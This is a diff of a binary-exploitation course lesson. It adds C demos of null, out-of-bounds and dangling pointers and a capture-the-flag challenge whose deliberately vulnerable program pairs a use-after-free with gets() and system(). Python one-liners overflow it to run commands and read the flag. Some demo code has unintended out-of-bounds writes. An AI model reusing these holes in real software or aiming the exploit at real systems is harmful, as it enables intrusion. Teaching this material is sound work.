@@ -1,11 +1,12 @@
-Session 4 - Intro to Vulns Part 1
-=================================
+Session 4 - Intro to Vulns
+==========================
 
 In this session, we will take a broad look at the common classes of
 vulnerabilities present in binary based executables. These include memory
 corruption bugs, unintended use of library functions, and arbitrary precision
 limitations. We will cover Format String Vulnerabilities, Integer Overflows and
-Underflows, and Uninitialised Memory in this session.
+Underflows, Uninitialised Memory, Illegal Memory Accesses, Overflow-Based
+Vulnerabilities, and Faulty Memory Management.
 
 Objectives
 ----------
@@ -14,9 +15,9 @@ Objectives
 2. Integer Overflows and Underflows
 3. Memory Corruption Vulnerabilities
     1. Uninitialised Memory
-    2. Illegal Memory Accesses
-    3. Overflow-Based
-    4. Faulty Memory Management
+    2. Out-of-Bounds Memory Accesses
+    3. Overflow-Based (We will cover this next session)
+    4. Faulty Memory Management (We will cover this next session)
 
 
 1. Format String Vulnerabilities
@@ -494,7 +495,7 @@ Gem = 50
 New Gem = 0
 ```
 
-An odd thing, if we didn't know about integer overflows, happened. We expected
+An odd thing happened (if you didn't know about integer overflows). We expected
 for the new gem to have the value 256, but it contains 0 instead. Why exactly
 does this happen though? If we look at the size of an `unsigned char`, it is an
 unsigned data type that occupies 1 byte in memory. 1 byte is 8 bits. Since it is
@@ -770,7 +771,7 @@ Memory corruption vulnerabilities are the bread and butter of much of systems
 security research. We will classify them in four broad categories:
 
 1. Uninitialised Memory
-2. Illegal Memory Accesses
+2. Use of None-Owned Memory
 3. Overflow-Based
 4. Faulty Memory Management
 
@@ -972,6 +973,301 @@ Level: 101
 Woooo, he is totally RAD!
 ```
 
+### Illegal Memory Accesses
+
+We will define illegal memory accesses in three ways:
+
+1. Null Pointers
+2. Out-of-Bounds Memory Pointers
+3. Dangling Pointers
+
+The common theme between the three is that the pointers are none-owned, that is,
+the pointers point to no man's land in memory. At the very least, the
+exploitation of these vulnerabilities will result in a denial-of-service
+condition. There is the potential for code execution or privilege escalation in
+certain cases.
+
+#### Null Pointers
+
+Null pointers are straightforward. The bug happens when the pointer is
+dereferenced. Usually this causes the program to crash but it is possible to
+turn this into a [local privilege escalation][16] exploit. Let's take a look at
+a trivial [example][17]:
+
+```c
+#include <stdio.h>
+
+int main() {
+    int *ptr = 0;
+    printf("Pointer: 0x%x\n", ptr);
+    printf("Pointer Value: 0x%x\n", *ptr);
+    return 0;
+}
+```
+
+If we run this, we will get a segmentation fault since the null dereference will
+cause the kernel raise a page fault error:
+
+```console
+$ ./null1
+Pointer: 0x0
+Segmentation fault (core dumped)
+```
+
+#### Out-of-Bounds Memory Accesses
+
+The null pointer dereference is a subset of this category. Typically, in an
+out-of-bounds memory access, the program attempts to dereference areas of memory
+that are not mapped. Here is an [example][18]:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+    char *array = "AAAA";
+    printf("Array Address: 0x%x\n", array);
+    printf("Array Contents: %s\n", array);
+    strcpy(&array, array);
+    printf("New Array Address: 0x%x\n", array);
+    printf("New Array Contents: %s\n", array);
+    return 0;
+}
+```
+
+In the example, we print a string buffer normally, then we overwrite the string
+pointer with the string itself causing a dereference from `0x41414141` (AAAA).
+This should cause a crash since `0x41414141` is not mapped in memory.
+
+```console
+$ ./outofbounds1
+Array Address: 0x80485c0
+Array Contents: AAAA
+New Array Address: 0x41414141
+Segmentation fault (core dumped)
+```
+
+If we check what is mapped in memory, we can see that `0x41414141` is not in any
+of the ranges:
+
+```console
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x08048000 0x08049000 r-xp      /nightsoferised/sessions/session4/illeagle/outofbounds1
+0x08049000 0x0804a000 r--p      /nightsoferised/sessions/session4/illeagle/outofbounds1
+0x0804a000 0x0804b000 rw-p      /nightsoferised/sessions/session4/illeagle/outofbounds1
+0xf7dfa000 0xf7dfb000 rw-p      mapped
+0xf7dfb000 0xf7faf000 r-xp      /lib/i386-linux-gnu/libc-2.21.so
+0xf7faf000 0xf7fb2000 r--p      /lib/i386-linux-gnu/libc-2.21.so
+0xf7fb2000 0xf7fb4000 rw-p      /lib/i386-linux-gnu/libc-2.21.so
+0xf7fb4000 0xf7fb6000 rw-p      mapped
+0xf7fd4000 0xf7fd7000 rw-p      mapped
+0xf7fd7000 0xf7fd9000 r--p      [vvar]
+0xf7fd9000 0xf7fda000 r-xp      [vdso]
+0xf7fda000 0xf7ffc000 r-xp      /lib/i386-linux-gnu/ld-2.21.so
+0xf7ffc000 0xf7ffd000 r--p      /lib/i386-linux-gnu/ld-2.21.so
+0xf7ffd000 0xf7ffe000 rw-p      /lib/i386-linux-gnu/ld-2.21.so
+0xfffdd000 0xffffe000 rw-p      [stack]
+```
+
+#### Dangling Pointers
+
+Dangling pointers are pointers that point to data which are no longer valid.
+This can happen when a pointer points to an object that falls out of scope (this
+can happen with local variables in functions) or when a pointer points to freed
+regions of memory (we will talk more about this in the next section: Faulty
+Memory Management).
+
+Now, let's take a look at what happens when pointers use an object that falls
+out of scope. Have a look at this [example][19]:
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+
+void assign(int **pointy) {
+    int workers[100] = {0};
+    int the_boss = 0x41414141;
+    *pointy = &the_boss;
+}
+
+void slackoff(int dowork) {
+    int boredom[100] =  {0};
+    int slack = 0xdeadbeef;
+    printf("0x%x sounds boring. Ignore!\n", dowork);
+    printf("I will slack off for 0x%x seconds!\n", slack);
+}
+
+int main() {
+    int *ptr;
+    assign(&ptr);
+    printf("Pointer: address 0x%x and value 0x%x\n", ptr, *ptr);
+    slackoff(0xcafebabe);
+    printf("Slack Pointer: address 0x%x and value 0x%x\n", ptr, *ptr);
+    return 0;
+}
+```
+
+It can get a little confusing but what happens here is that the pointer `ptr`
+gets pointed to a region of memory allocated on the stack during `assign()` and
+then the address that the pointer is pointing to gets printed along with the
+value of that address. Normally, we would expect the pointer not to change since
+nothing is done to it in the `slackoff()` function. However, this is shown not
+to be the case when we run the example:
+
+```console
+$ ./dangling1
+Pointer: address 0xff7fed08 and value 0x41414141
+0xcafebabe sounds boring. Ignore!
+I will slack off for 0xdeadbeef seconds!
+Slack Pointer: address 0xff7fed08 and value 0xdeadbeef
+```
+
+If you notice, the first time the pointer gets dumped, it seems like the region
+of memory allocated in `assign()` is still intact, with the value `0x41414141`
+printed as expected. This is misleading however, since we have dropped out of
+that function's scope. Now, when we call `slackoff()`, a new stack space is
+set up with the new scope and values are overwritten. Hence, we now see that the
+pointer contains the same address but a different value.
+
+If this is a little confusing, just imagine this is what pointers look like
+immediately after the `assign()` call:
+
+![during assign][dangling1assign]
+
+And after the `slackoff()` call:
+
+![during slackoff][dangling1slack]
+
+In addition to dangling pointers caused by falling out of scope, dangling
+pointers can also arise from using freed memory (this we will go into detail in
+the Faulty Memory Management segment next session). However, we will give you a
+little taste as to how the vulnerability looks like in this [example][20]:
+
+```c
+#include <stdlib.h>
+
+int main() {
+    char *ptr = malloc(50);
+    memset(ptr, 0x41, 50);
+    ptr[99] = 0;
+    printf("Contents of ptr: %s\n", ptr);
+    free(ptr);
+    printf("We freed ptr\n");
+
+    printf("Doing some completely unrelated thing.\n");
+    char *unrelated = malloc(50);
+    memset(unrelated, 0x42, 50);
+    unrelated[99] = 0;
+
+    printf("Contents of ptr: %s\n", ptr);
+    return 0;
+}
+```
+
+In the example, we allocate 50 bytes of memory with `malloc` and store the
+address in `ptr`. We fill the buffer with "A"s (0x41) and print it. Next, we
+free the memory pointed to by the pointer for other use. Then, we allocate
+another 50 bytes with `malloc` and fill the buffer with "B"s (0x42). We then
+print from the memory address pointed to by the pointer `ptr` again. It is
+uncertain what should happen since it had been freed.
+
+Let's run the program to see what happens:
+
+```console
+$ ./dangling2
+Contents of ptr: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+We freed ptr
+Doing some completely unrelated thing.
+Contents of ptr: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+```
+
+Now, it seems like the unrelated thing we did affected the freed region of
+memory. That's pretty interesting.
+
+4. Closing Challenge
+--------------------
+
+To conclude this session, let's try a little [challenge][21]:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+struct streamer {
+    char name[40];
+    char cmd[10];
+};
+
+int main() {
+    struct streamer *helena = (struct streamer*) malloc(sizeof(struct streamer));
+    strcpy(helena->name, "Helena");
+    strcpy(helena->cmd, "id");
+    printf("I am %s, and my command is %s.\n", helena->name, helena->cmd);
+    free(helena);
+
+    struct streamer *guest = (struct streamer*) malloc(sizeof(struct streamer));
+    printf("Welcome guest streamer! My command is the best, you have it too!\n");
+    strcpy(guest->cmd, helena->cmd);
+    printf("What is your name: ");
+    gets(guest->name);
+    printf("Hello, %s!\n", guest->name);
+
+    printf("I'm going to execute my command now, because I'm cool.\n");
+    system(helena->cmd);
+    return 0;
+}
+```
+
+If we look at what the program does, we see that it creates a `struct streamer`
+called `helena`. It sets the `helena->name` and `helena->cmd` to static strings
+and frees the struct. Next, a `struct streamer` called `guest` is allocated
+memory and only the `guest->name` is written to with `gets()`. Finally,
+`helena->cmd` is executed through `system()`.
+
+Now, this is a clear case of the dangling pointer vulnerability we talked about
+earlier. Also, there is a buffer overflow with the write to `guest->name` with
+`gets()`. We can use these two vulnerabilities to write an exploit that executes
+arbitrary commands.
+
+```console
+$ ./helena
+I am Helena, and my command is id.
+Welcome guest streamer! My command is the best, you have it too!
+What is your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa!
+I'm going to execute my command now, because I'm cool.
+sh: 1: AAAAAAAAAAa: not found
+```
+
+Notice that we can overwrite `helena->cmd` when writing to `guest->name` because
+the buffer overflow lets us write past the bounds of `guest->name` to fill
+`guest->cmd` and since the dangling pointer lets us use `guest->cmd` as
+`helena->cmd`, we can execute anything we want with system.
+
+```console
+$ python -c 'print "A"*40+"ls"' | ./helena
+I am Helena, and my command is id.
+Welcome guest streamer! My command is the best, you have it too!
+What is your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls!
+I'm going to execute my command now, because I'm cool.
+flag.txt  helena  helena.c
+```
+
+Seeing that there is a `flag.txt` on the filesystem, we can read it.
+
+```
+$ python -c 'print "A"*40+"cat flag.txt"' | ./helena
+I am Helena, and my command is id.
+Welcome guest streamer! My command is the best, you have it too!
+What is your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag.txt!
+I'm going to execute my command now, because I'm cool.
+Erised{Yay_Simple_b0f_and_d4ngle}
+```
+
+And we have our flag.
+
 [//]: # (Links)
 [1]: ./formatstring/basic1.c
 [2]: ./formatstring/basic2.c
@@ -988,6 +1284,12 @@ Woooo, he is totally RAD!
 [13]: ./uninitialised/uninit1.c
 [14]: http://www.cvedetails.com/cve/CVE-2011-0036/
 [15]: ./uninitialised/uninit2.c
+[16]: https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting1
+[17]: ./illeagle/null1.c
+[18]: ./illeagle/outofbounds1.c
+[19]: ./illeagle/dangling1.c
+[20]: ./illeagle/dangling2.c
+[21]: ./closing/helena.c
 
 [//]: # (Images)
 [basic2stack]: ./images/basic2stack.png
@@ -995,3 +1297,5 @@ Woooo, he is totally RAD!
 [uninit1before]: ./images/uninit1-firsteat.png
 [uninit1during]: ./images/uninit1-everything.png
 [uninit1after]: ./images/uninit1-secondeat.png
+[dangling1assign]: ./images/dangling1-assign.png
+[dangling1slack]: ./images/dangling1-slackoff.png
